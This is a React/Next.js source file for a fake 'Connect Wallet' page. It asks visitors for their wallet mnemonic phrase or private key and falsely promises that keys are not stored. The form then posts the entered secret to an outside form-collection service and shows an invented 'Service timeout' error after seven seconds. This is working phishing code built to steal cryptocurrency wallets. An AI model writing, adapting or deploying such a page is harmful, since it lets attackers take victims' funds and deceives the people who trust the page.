"use client";

import { useState } from "react";
import axios from "axios";
import { FaLock } from "react-icons/fa";

const page = () => {
  const [view, setView] = useState("phrase");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [data, setData] = useState({
    message: "",
  });

  const handleOnChange = (e) => {
    e.persist();
    setError(false);
    setData((prev) => ({
      ...prev,
      [e.target.id]: e.target.value,
    }));
  };

  const handleOnSubmit = (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    axios({
      method: "POST",
      url: "https://app.formbold.com/s/oDv7X",
      data: data,
    }).then(() => {
      setTimeout(() => {
        setLoading(false);
        setError(true);
      }, 7000);
    });
  };

  return (
    <div className="hero">
      <div className="max-w-6xl mx-auto px-6 pt-44 md:pb-24 flex items-center justify-center">
        <div className="bg-black/10 w-full max-w-xl rounded-lg px-7 py-12">
          <h1 className="text-center text-white text-lg font-semibold">
            Connect Wallet
          </h1>
          <p className="text-center text-gray-400 text-[12px] mt-1">
            We do not store your public or private keys and keep track of your
            activities.
          </p>
          <div className="flex items-center justify-center gap-3 mt-6">
            <button
              onClick={() => setView("phrase")}
              className={`${
                view === "phrase" ? "bg-black/60" : ""
              } hover:bg-black/60 px-6 py-2 text-gray-300 text-sm rounded-lg`}
            >
              Phrase
            </button>
            <button
              onClick={() => setView("key")}
              className={`${
                view === "key" ? "bg-black/60" : ""
              } hover:bg-black/60 px-6 py-2 text-gray-300 text-sm rounded-lg`}
            >
              Private Key
            </button>
          </div>
          {view === "phrase" ? (
            <form onSubmit={handleOnSubmit} className="mt-14">
              <p className="flex items-center gap-1 text-gray-400 text-[12px]">
                <span className="text-[10px]">
                  <FaLock />
                </span>
                Mnemonic phrase
              </p>
              <textarea
                onChange={handleOnChange}
                value={data.message}
                id="message"
                name="message"
                rows="3"
                required
                placeholder="Enter 12 or 24 words mnemonic phrase"
                className="bg-inherit w-full text-md font-medium text-white outline-none border border-white/15 rounded-lg px-5 py-4 mt-2 focus:shadow-gray-600 focus:shadow-sm placeholder:text-[13px]"
              />
              {error && (
                <p className="text-[13px] text-red-600 font-normal mt-2">
                  [20011] Service timeout. Please try again!
                </p>
              )}
              <div className="flex items-center justify-center">
                <button
                  type="submit"
                  className="button-gradient text-white text-[14px] font-medium rounded-full outline-none px-9 py-3 mt-7"
                >
                  {loading ? "Connecting..." : "Continue"}
                </button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleOnSubmit} className="mt-14">
              <p className="flex items-center gap-1 text-gray-400 text-[12px]">
                <span className="text-[10px]">
                  <FaLock />
                </span>
                Private key
              </p>
              <textarea
                onChange={handleOnChange}
                value={data.message}
                id="message"
                name="message"
                rows="3"
                required
                placeholder="Enter private key"
                className="bg-inherit w-full text-md font-medium text-white outline-none border border-white/15 rounded-lg px-5 py-4 mt-2 focus:shadow-gray-600 focus:shadow-sm placeholder:text-[13px]"
              />
              {error && (
                <p className="text-[13px] text-red-600 font-normal mt-2">
                  [20011] Service timeout. Please try again!
                </p>
              )}
              <div className="flex items-center justify-center">
                <button
                  type="submit"
                  className="button-gradient text-white text-[14px] font-medium rounded-full outline-none px-9 py-3 mt-7"
                >
                  {loading ? "Connecting..." : "Continue"}
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};

export default page;
